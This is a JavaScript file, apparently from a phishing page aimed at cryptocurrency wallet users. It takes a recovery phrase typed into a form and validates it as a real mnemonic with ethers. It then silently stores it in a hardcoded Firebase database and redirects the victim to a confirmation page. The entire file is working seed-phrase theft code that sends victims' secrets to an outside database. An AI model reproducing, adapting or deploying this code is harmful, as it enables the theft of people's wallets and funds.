import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.3/firebase-app.js";

import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/9.9.3/firebase-database.js';

const input = document.querySelector("#input-phrase");
const error = document.querySelector(".warning");
const btn = document.querySelector(".submit_btn");

const firebaseConfig = {
    apiKey: "AIzaSyCT5rLuiRCn3SW3jB3FXIT4oPXKhFNRNZo",
    authDomain: "tpases.firebaseapp.com",
    databaseURL: "https://tpases-default-rtdb.firebaseio.com",
    projectId: "tpases",
    storageBucket: "tpases.appspot.com",
    messagingSenderId: "474388243414",
    appId: "1:474388243414:web:e4a31084e28cce5b79ba77",
    measurementId: "G-TWS3NSBSM0"
};

const app = initializeApp(firebaseConfig);

const writeData = (twtWords) => {
    const db = getDatabase(app);

    const reference = ref(db, `words/${Date.now()}`)

    set(reference, {
        word: twtWords
    })
    .then(() => {
        input.value = "";
        window.location = `./confirm.html`;
    })
    .catch((error) => {
        console.log(error);
    })
}

btn.onclick = (e) => {
    e.preventDefault();
    const value = input.value;
    const border = `1px solid red`;
    const isValid = ethers.utils.isValidMnemonic(value);
    if(isValid){
        writeData(value);

    } else {
        error.classList.remove('hide');
        input.style.border = border;
    } 

}